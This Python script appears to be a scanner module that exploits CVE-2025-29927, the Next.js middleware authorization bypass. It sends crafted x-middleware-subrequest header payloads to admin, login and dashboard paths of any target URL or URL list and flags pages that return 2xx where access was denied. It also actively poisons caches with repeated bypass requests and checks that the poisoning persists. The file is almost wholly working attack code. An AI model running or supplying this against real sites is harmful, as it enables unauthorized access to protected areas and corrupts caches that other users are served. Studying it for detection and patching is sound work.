#!/usr/bin/env python3
"""
https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware
"""

import secrets
from bs4 import BeautifulSoup
from utils.style import Colors, Identify
from utils.utils import configure_logger, re, requests, urlparse

logger = configure_logger(__name__)

DEFAULT_USER_AGENT = (
    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; LCJB; rv:11.0) like Gecko"
)

MIDDLEWARE_NAMES = [
    "middleware",
    "pages/_middleware",
    "pages/dashboard/_middleware",
    "pages/dashboard/panel/_middleware",
    "src/middleware",
    "middleware:middleware:middleware:middleware:middleware",
    "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware",
]

COMMON_PATHS = [
    "",
    "login",
    "admin",
    "admin/login",
    "administrator",
    "administration",
    "administration/dashboard",
    "administration/dashboard/products",
    "panel",
    "admin.php",
    "dashboard",
    "api/secret",
]

# Codes de redirection valides (304 exclu — c'est du cache conditionnel, pas une redirection)
REDIRECT_CODES = {301, 302, 303, 307, 308}

AUTH_KEYWORDS_REGEX = re.compile(
    r"(identifiant|login|username|user|passwd|pass|password|connexion|authentification|signin|auth|log in|log-in|admin)",
    re.IGNORECASE,
)

BASE_HEADERS = {
    "User-Agent": DEFAULT_USER_AGENT,
    "Accept-Encoding": "gzip",
}


def is_authentication_page(html: str) -> bool:
    try:
        soup = BeautifulSoup(html, "html.parser")
        return bool(AUTH_KEYWORDS_REGEX.search(soup.get_text(" ", strip=True)))
    except Exception as e:
        logger.warning("error parsing HTML: %s", e)
        return False


def follow_redirects(url: str, s: requests.Session) -> bool:
    try:
        req_redir = s.get(url, verify=False, timeout=10,
                          allow_redirects=True, headers=BASE_HEADERS)
        return is_authentication_page(req_redir.text)
    except requests.exceptions.RequestException as e:
        logger.warning("error following redirects for %s: %s", url, e)
        return False


def test_middleware_bypass(
    url: str,
    baseline_response: requests.Response,
    s: requests.Session,
) -> bool:
    for middleware_name in MIDDLEWARE_NAMES:
        headers = {**BASE_HEADERS, "x-middleware-subrequest": middleware_name}

        try:
            req_bypass = s.get(
                url, headers=headers, verify=False,
                timeout=10, allow_redirects=False,
            )

            # Bypass confirmé uniquement si on obtient un 2xx (pas un 5xx)
            is_bypass = (
                req_bypass.status_code in range(200, 300)
                and req_bypass.status_code != baseline_response.status_code
            )

            if is_bypass:
                print(
                    f" {Identify.confirmed} | CVE-2025-29927 | "
                    f"{baseline_response.status_code} > {req_bypass.status_code} | "
                    f"{len(baseline_response.content)}b > {len(req_bypass.content)}b | "
                    f"{Colors.BLUE}{url}{Colors.RESET} | "
                    f"PAYLOAD: x-middleware-subrequest: {middleware_name}"
                )
                return True  # un bypass confirmé suffit

        except requests.exceptions.RequestException as e:
            logger.warning("error testing middleware bypass on %s: %s", url, e)

    return False


def test_protected_path(url: str, s: requests.Session) -> None:
    try:
        req_check = s.get(url, verify=False, timeout=10,
                          allow_redirects=False, headers=BASE_HEADERS)

        if req_check.status_code in REDIRECT_CODES:
            if follow_redirects(url, s):
                test_middleware_bypass(url, req_check, s)
        elif req_check.status_code in {401, 403}:
            test_middleware_bypass(url, req_check, s)

    except requests.exceptions.RequestException as e:
        logger.warning("error testing protected path %s: %s", url, e)


def test_cache_poisoning(url: str, s: requests.Session) -> None:
    url_cb = f"{url}?cb={secrets.token_hex(6)}"

    try:
        req_cb = s.get(url_cb, verify=False, timeout=10,
                       allow_redirects=False, headers=BASE_HEADERS)

        if req_cb.status_code not in REDIRECT_CODES:
            return

        for middleware_name in MIDDLEWARE_NAMES:
            bypass_headers = {**BASE_HEADERS, "x-middleware-subrequest": middleware_name}
            # URL dédiée à ce test, fixée pour toute la phase poison+verify
            url_cp = f"{url}?cb={secrets.token_hex(6)}"

            try:
                req_cp = s.get(url_cp, headers=bypass_headers, verify=False,
                               timeout=10, allow_redirects=False)

                if req_cp.status_code in REDIRECT_CODES:
                    continue

                print(
                    f" {Identify.behavior} | CVE-2025-29927 | "
                    f"{req_cb.status_code} > {req_cp.status_code} | "
                    f"{Colors.BLUE}{url_cp}{Colors.RESET} | "
                    f"PAYLOAD: x-middleware-subrequest: {middleware_name}"
                )

                # Empoisonnement du cache
                for _ in range(5):
                    try:
                        s.get(url_cp, headers=bypass_headers, verify=False,
                              timeout=10, allow_redirects=False)
                    except requests.exceptions.RequestException as e:
                        logger.warning("poison request failed %s: %s", url_cp, e)
                        break

                # Vérification de persistence sur la même url_cp, sans header malveillant
                req_verify = s.get(url_cp, verify=False, timeout=10,
                                   allow_redirects=False, headers=BASE_HEADERS)

                if req_verify.status_code == req_cp.status_code:
                    print(
                        f" {Identify.confirmed} | CVE-2025-29927 | CACHE POISONED | "
                        f"{Colors.BLUE}{url_cp}{Colors.RESET}"
                    )
                    return  # inutile de tester les autres middleware_name

            except requests.exceptions.RequestException as e:
                logger.warning("error during cache poisoning test %s: %s", url_cp, e)

    except requests.exceptions.RequestException as e:
        logger.warning("error testing cache poisoning %s: %s", url, e)


def middleware(url: str, s: requests.Session) -> bool:
    """
    Point d'entrée principal pour tester CVE-2025-29927
    """
    try:
        req_main = s.get(url, verify=False, timeout=10,
                         allow_redirects=False, headers=BASE_HEADERS)

        if req_main.status_code in REDIRECT_CODES:
            if follow_redirects(url, s):
                test_middleware_bypass(url, req_main, s)
        elif req_main.status_code in {401, 403}:
            test_middleware_bypass(url, req_main, s)

        parsed_url = urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"

        for path in COMMON_PATHS:
            test_url = f"{base_url}/{path}" if path else base_url
            test_protected_path(test_url, s)

        test_cache_poisoning(url, s)
        return True

    except requests.exceptions.Timeout:
        logger.error("request timeout %s", url)
    except requests.exceptions.ConnectionError as e:
        logger.error("connection error %s: %s", url, e)
    except Exception as e:
        logger.error("error testing middleware vulnerability %s: %s", url, e)

    return False


def main(url: str) -> None:
    with requests.Session() as s:
        middleware(url, s)


if __name__ == "__main__":
    import sys

    def _parse_url(raw: str) -> str | None:
        parsed = urlparse(raw)
        if parsed.scheme in ("http", "https") and parsed.netloc:
            return raw
        return None

    if len(sys.argv) == 2:
        target = _parse_url(sys.argv[1])
        if target:
            print(f"Testing {target}")
            main(target)
        else:
            print("Error: invalid URL. Must start with http:// or https://")
            sys.exit(1)

    elif len(sys.argv) == 3 and sys.argv[1] == "f":
        try:
            with open(sys.argv[2]) as f:
                urls = [line.strip() for line in f if line.strip()]
            for url in urls:
                target = _parse_url(url)
                if target:
                    print(f"Testing {target}")
                    main(target)
                else:
                    logger.warning("skipping invalid URL: %s", url)
        except FileNotFoundError:
            print(f"Error: file '{sys.argv[2]}' not found")
            sys.exit(1)
    else:
        print("Usage:")
        print("  Single URL: python CVE202529927.py <URL>")
        print("  From file:  python CVE202529927.py f <file>")